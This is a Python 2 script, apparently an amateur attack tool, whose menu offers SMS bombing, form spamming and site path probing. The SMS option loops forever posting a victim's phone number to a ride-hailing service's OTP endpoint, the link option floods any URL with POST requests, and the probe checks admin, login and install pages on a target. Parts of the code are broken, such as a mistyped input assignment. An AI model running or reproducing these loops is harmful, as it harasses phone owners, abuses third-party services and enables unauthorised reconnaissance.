# usr/bin/python2
# IMPORT
import os
import sys
import time 
import requests
from colorama import Fore,init

init()

os.system('cls')
# ==============================
# MOSHAKHAST
print (Fore.CYAN+"MOSHAKASAT")
time.sleep(2)
name1 = raw_input("Enter The Name = ")
age = input("Enter The Age =")
if age < 13:
    print (Fore.LIGHTRED_EX+"[-] Plase Not Age")
    sys.exit()
elif age > 13:
    print (Fore.LIGHTGREEN_EX+"[+] Plase Yes Age")


# ==============================
# TAZINAT

print (Fore.GREEN+"GRADE BY TRACEUR HASHASHIN")
time.sleep(3)

print "||#<<<<<<<<<<<<<<<<<<<<<$>>>>>>>>>>>>>>>>>>>>>#||"
time.sleep(1)
print "||^              GRADE BY 2020                ^||"
time.sleep(1)
print "||^          PLAESE A WEB ASSASSIN            ^||"
time.sleep(1)
print "||^      PLASE A WEB DARK HASHASHIN 2020      ^||"
time.sleep(1)
print "||^    MADE IN PERSIAN IRAN DARK WEB IRANIAN  ^||"
time.sleep(1)
print "||^                                           ^||"
time.sleep(1)
print "||^                                           ^||"
time.sleep(1)
print "||#<<<<<<<<<<<<<<<<<<<<<$>>>>>>>>>>>>>>>>>>>>>#||"
time.sleep(3)

# ============================================
# GITHUB

print (Fore.WHITE+"Chose a options</>")
time.sleep(1)
print
print (Fore.LIGHTYELLOW_EX+"1 = SPAM SMS")
print (Fore.LIGHTBLUE_EX+"2 = SPAM LINK")
print (Fore.LIGHTMAGENTA_EX+"3 = FIND WEB BY ROBOT")
print (Fore.CYAN+"4 = FIND WEB HANDS YOU")
print (Fore.LIGHTRED_EX+"5 = EXIT")
print
select = input("Chose a option = ")
time.sleep(1)
print select 

if select == 1:
    print (Fore.GREEN+"SPAM SMS")
    time.sleep(1)
    print ("nemoneh = 9*********")
    phone = raw_input("Enter The Number = ")
    urlsend = "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp"
    mydata =  {"cellphone":"+98"+phone}
    time.sleep(1)
    time1 = input("Plase Enter The Time = ")
    while True:
        requests.post(urlsend,data=mydata)
        print ("SEND SMS",phone)
        time.sleep(time1)
elif select == 2:
    print (Fore.LIGHTBLUE_EX+"SPAM LINK")
    print (Fore.LIGHTBLUE_EX+"SPAM LINK AZMON GOOGLE AND ... ")
    url = raw_input("Enter The URL = ")
    data1 = raw_input("Enter The Data = ")
    print (Fore.RED+"Is Full Time = 0 ")
    time.sleep(1)
    time2 = raw_input("Enter The Time = ")
    while True:
        requests.post(url,data=data1)
        print (Fore.LIGHTBLUE_EX+"SEND TICKET",url)
        time.sleep(time2)
elif select == 3:
    print (Fore.LIGHTMAGENTA_EX+"FIND WEB BY ROBOT")
    time.sleep(2)
    print ("nemoneh = shad.ir")
    search = ['robots.txt' , 'search/' , 'admin/' , 'login/' , 'themes/' , 'user/' , 'user/logout/' , 'user/reqister/' , 'node/add/' , 'install.php' , 'user/password/' ]
    url1 = raw_input("Plase Enter The URL = ")
    for page in search:
        req = requests.get("https://"+url1+"/"+page)
        if req.status_code == 200:
            print(Fore.GREEN+" [+] "+Fore.WHITE+" page OK "+url1+"/"+page )
        else:
            print(Fore.RED+" [-] "+Fore.WHITE+" page NO "+url1+"/"+page )
elif select == 4:
    print (Fore.CYAN+"FIND WEB BY HANDS YOU")
    time.sleep(1)
    search1 = raw_input("Plase Enter The Search and Find Web = ")
    url2 = raw_input=("Plase Enter The URL = ")
    for page in search1:
        req1 = requests.get("https://"+url2+"/"+page)
        if req1.status_code == 200:
            print (Fore.GREEN+" [+] "+Fore.WHITE+" page OK "+url2+"/"+page )
        else:
            print (Fore.RED+" [-] "+Fore.WHITE+" page NO "+url1+"/"+page )
elif select == 5:
    print (Fore.LIGHTBLUE_EX+"Thang" , name1)
    sys.exit()
 



# GRADE BY TRACEUR HASHASHIN
# ========================================




